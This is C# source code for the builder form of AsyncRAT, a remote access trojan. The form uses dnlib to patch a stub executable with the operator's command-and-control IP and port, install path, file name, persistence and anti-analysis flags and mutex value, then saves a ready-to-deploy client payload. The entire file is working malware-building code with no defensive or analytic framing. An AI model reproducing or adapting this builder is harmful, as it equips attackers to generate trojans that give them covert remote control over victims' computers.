using System;
using System.Linq;
using System.Windows.Forms;
using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System.IO;
using System.Threading.Tasks;

namespace AsyncRAT_Sharp.Forms
{
    public partial class FormBuilder : Form
    {
        public FormBuilder()
        {
            InitializeComponent();
        }

        private async void button1_Click(object sender, EventArgs e)
        {

            if (string.IsNullOrWhiteSpace(textIP.Text) || string.IsNullOrWhiteSpace(textPort.Text)) return;
            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) || string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }
            try
            {
                button1.Enabled = false;
                var md = ModuleDefMD.Load(Path.Combine(Application.StartupPath, @"Stub\Stub.exe"));
                foreach (TypeDef type in md.Types)
                {
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                {
                                    if (method.Body.Instructions[i].Operand.ToString() == "127.0.0.1")
                                        method.Body.Instructions[i].Operand = textIP.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "6606")
                                        method.Body.Instructions[i].Operand = textPort.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "%AppData%")
                                        method.Body.Instructions[i].Operand = comboBoxFolder.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "Payload.exe")
                                        method.Body.Instructions[i].Operand = textFilename.Text;

                                    if (method.Body.Instructions[i].Operand.ToString() == "false")
                                        method.Body.Instructions[i].Operand = checkBox1.Checked.ToString().ToLower();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                        method.Body.Instructions[i].Operand = chkAnti.Checked.ToString().ToLower();

                                    if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                        method.Body.Instructions[i].Operand = Settings.Password; //Guid.NewGuid().ToString();

                                    if (method.Body.Instructions[i].Operand.ToString() == "NYAN CAT")
                                        method.Body.Instructions[i].Operand = Settings.Password;
                                }
                            }
                        }
                }

                SaveFileDialog saveFileDialog1 = new SaveFileDialog();
                saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                saveFileDialog1.InitialDirectory = Application.StartupPath;
                saveFileDialog1.OverwritePrompt = false;
                saveFileDialog1.FileName = "Client";
                if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    bool isok = false; ;
                    await Task.Run(() =>
                    {
                        try
                        {
                            md.Write(saveFileDialog1.FileName);
                            isok = true;
                        }
                        catch (Exception ex)
                        {
                            MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            isok = false;
                        }
                    });
                    if (isok == true)
                    {
                        MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        Properties.Settings.Default.DNS = textIP.Text;
                        Properties.Settings.Default.Filename = textFilename.Text;
                        Properties.Settings.Default.Save();
                        button1.Enabled = true;
                        this.Close();
                    }
                    else
                        button1.Enabled = true;
                }
                else
                    button1.Enabled = true;

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                button1.Enabled = true;
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "ON";
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "OFF";
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            comboBoxFolder.SelectedIndex = 0;
            textPort.Text = Settings.Port;
            if (Properties.Settings.Default.DNS.Length > 0)
                textIP.Text = Properties.Settings.Default.DNS;
            else
                textIP.Text = "127.0.0.1,127.0.0.1";
            if (Properties.Settings.Default.Filename.Length > 0)
                textFilename.Text = Properties.Settings.Default.Filename;
        }
    }
}